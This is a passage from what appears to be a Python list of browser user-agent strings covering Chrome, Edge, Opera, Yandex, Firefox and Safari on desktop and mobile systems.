    'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_0_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.149 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.158 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.124 YaBrowser/22.9.5.710 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.27',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.33',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 OPR/91.0.4516.106',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 OPR/91.0.4516.106 (Edition std-1)',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 OPR/91.0.4516.106 (Edition Yx GX)',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edg/106.0.1370.34',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edg/106.0.1370.42',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edg/106.0.1370.52',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edg/106.0.1370.61',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edg/106.0.1370.72',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 OPR/92.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 OPR/92.0.0.0 (Edition std-1)',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 OPR/92.0.0.0 (Edition Yx 08)',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 OPR/92.0.0.0 (Edition Yx GX)',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 YaBrowser/22.11.0.2419 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 YaBrowser/22.11.0.2424 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.181 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.26',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.35',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.42',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.52',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.56',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 OPR/93.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Viewer/97.9.5538.39',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.110 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.18 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.71 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.122 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4539.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36 Edg/96.0.1054.43',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 Edg/97.0.1072.55',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36 Edg/99.0.1150.39',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.106.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.107.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.107.0.0 Safari/537.36 Edg/99.107.1418.24',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko, Foregenix) Chrome/91.0.4472.77 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.143 YaBrowser/22.5.0.1816 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.114 YaBrowser/22.9.1.1096 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 OPR/91.0.4516.77 (Edition Yx)',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 OPR/92.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 YaBrowser/19.10.3.281 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 Core/1.94.175.400 QQBrowser/11.1.5155.400',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 Core/1.94.186.400 QQBrowser/11.3.5195.400',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.33',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.168 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.56',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Safari/537.36 Puffin/9.0.1.982WD',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0',
    'Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edg/106.0.1370.52',
    'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 OPR/92.0.0.0 (Edition Yx 05)',
    'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh_CN) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0 baidubrowser/1.x Safari/534.7',
    'Mozilla/5.0 (X11; CrOS aarch64 14526.69.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.82 Safari/537.36',
    'Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; CrOS x86_64 14989.107.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; CrOS x86_64 15054.114.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; CrOS x86_64 15117.111.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; CrOS x86_64 15117.112.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; CrOS x86_64 15117.86.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; CrOS x86_64 15117.87.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; CrOS x86_64 15183.38.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36',
    'Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/67.0.3396.99 Chrome/67.0.3396.99 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.66 Safari/537.36 OPR/89.0.4447.38',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.101 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.114 YaBrowser/22.9.1.1110 (beta) Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.124 YaBrowser/22.9.3.894 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 OPR/92.0.0.0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.35',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.42',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.43',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 OPR/93.0.0.0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 OPR/93.0.0.0 (Edition beta)',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) QtWebEngine/5.15.2 Chrome/83.0.4103.122 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/65.0.3325.181 Chrome/65.0.3325.181 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/602.1 (KHTML, like Gecko) splash Version/10.0 Safari/602.1',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:107.0) Gecko/20100101 Firefox/107.0',
    'Opera/9.80 (Android; Opera Mini/7.6.40234/191.278; U; ru) Presto/2.12.423 Version/12.16',
              'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)',
    'Mozilla/5.0 (iPad; CPU OS 14_4_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 15_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/107.0.5304.101 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/107.0.5304.101 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/107.0.5304.66 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 15_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6,2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/107.0.5304.101 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/87.0.4280.77 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/107.0.5304.101 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/107.0.5304.101 Mobile/15E148 Safari/604.1',
